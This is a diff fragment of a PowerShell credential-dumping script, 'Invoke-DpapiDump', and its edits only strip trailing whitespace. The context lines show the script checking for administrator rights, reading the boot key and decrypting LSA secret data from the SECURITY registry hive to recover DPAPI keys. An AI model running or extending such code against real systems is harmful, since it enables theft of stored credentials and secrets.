@@ -17,7 +17,7 @@ Function Invoke-DpapiDump {
 
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
-        Write-Warning "This command must be launched as an Administrator" 
+        Write-Warning "This command must be launched as an Administrator"
         return
     }
 
@@ -318,7 +318,7 @@ Function Local:Get-LsaDpapiKey {
         # Get the syskey a.k.a. bootkey
         $syskey = Get-Bootkey
         # Get the encryption key Blob
-        $encKeyBlob = Parse-LSASecretBlob (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")     
+        $encKeyBlob = Parse-LSASecretBlob (Get-ItemPropertyValue "HKLM:\SECURITY\Policy\PolEKList" -Name "(default)")
         # Decrypt the encryption key Blob using the syskey
         $decKeyBlob = Decrypt-LSASecretData $encKeyBlob.Data $syskey $encKeyBlob.IV
         # Parse the keys
